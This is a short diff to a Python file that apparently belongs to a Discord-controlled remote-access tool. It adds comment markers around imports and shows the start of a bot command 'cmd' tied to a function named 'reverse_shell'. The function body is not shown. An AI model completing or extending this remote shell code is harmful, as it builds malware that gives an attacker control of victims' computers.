@@ -1,8 +1,10 @@
+#<imports>
 import resources.modules.misc as pysilon_misc
 from PIL import ImageGrab
 import subprocess
 import asyncio
 import os
+#</imports>
 
 @client.command(name="cmd")
 async def reverse_shell(ctx, cmd_command=None):
